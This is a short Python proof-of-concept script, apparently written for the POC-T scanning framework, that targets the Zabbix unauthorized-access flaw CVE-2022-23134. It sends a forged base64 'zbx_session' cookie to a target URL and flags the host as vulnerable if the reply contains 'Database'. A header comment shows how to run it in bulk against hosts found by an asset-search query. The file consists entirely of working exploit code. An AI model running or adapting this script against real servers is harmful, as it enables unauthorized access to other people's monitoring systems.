#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   Zabbix_0_UNAUTHORIZED_ACCESS_CVE-2022-23134.py.py    
@Contact :   lihanwei@zhiqiansec.com
@DateTime :  2023/9/6 22:54

python POC-T.py -s Zabbix_0_UNAUTHORIZED_ACCESS_CVE-2022-23134.py -aF app="ZABBIX-监控系统"
'''

import requests


def poc(url):
    headers = {
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'Cookie': 'zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D'
    }
    try:
        response = requests.get(url, headers=headers, timeout=15, allow_redirects=True, verify=False)
        response_text = response.content
        if response_text.find(b'Database') != -1 and response.status_code == 200:
            return True
    except:
        return False